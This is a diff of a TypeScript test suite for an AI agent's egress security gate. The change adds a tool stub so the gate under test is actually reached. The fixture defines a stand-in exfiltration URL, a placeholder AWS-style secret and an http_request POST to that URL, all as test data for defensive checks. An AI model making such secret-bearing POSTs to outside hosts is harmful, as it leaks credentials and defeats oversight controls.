@@ -38,10 +38,16 @@ const SECRET = "AKIAIOSFODNN7EXAMPLE";
 // secret-bearing POST for want of a trusted destination).
 const EXFIL_URL = "https://exfil.example.invalid/collect";
 
+// The tool must BE a tool: lookupTool settles the name before any security
+// gate runs, so an empty toolMap would short-circuit here on "unknown tool"
+// and the gate under test would never be reached. Production always resolves
+// the tool first; this fixture matches it.
+const toolStub = (name: string) => ({ name, description: "", parameters: {}, execute: async () => ({ content: "" }) });
+
 function makeCtx(name: string, args: Record<string, unknown>, sessionId: string): ToolCallContext {
   return {
     tc: { id: "1", name, arguments: JSON.stringify(args) },
-    toolMap: new Map(),
+    toolMap: new Map([[name, toolStub(name)]]),
     security: undefined as never,
     sessionId,
     callContext: "local",
@@ -131,9 +137,8 @@ describe("SC-10 · kernel↔aggregate seam — a tainted POST surfaces the taint
     // downstream cohort finds nothing to block.
     const ctx = makeCtx("http_request", { method: "POST", url: EXFIL_URL, body: `{"note":"hello"}` }, sid);
     const outcome = await enforcePolicyPhase(ctx);
-    // The kernel gate does not short-circuit; the phase proceeds past the egress
-    // aggregate (it later halts elsewhere only for unrelated reasons — here the
-    // empty toolMap means lookupTool blocks, which is NOT an egress-aggregate).
+    // The kernel gate does not short-circuit; the phase proceeds past the
+    // egress aggregate without tagging one.
     expect(ctx.result?.metadata?.layer).not.toBe("egress-aggregate");
   });
 });
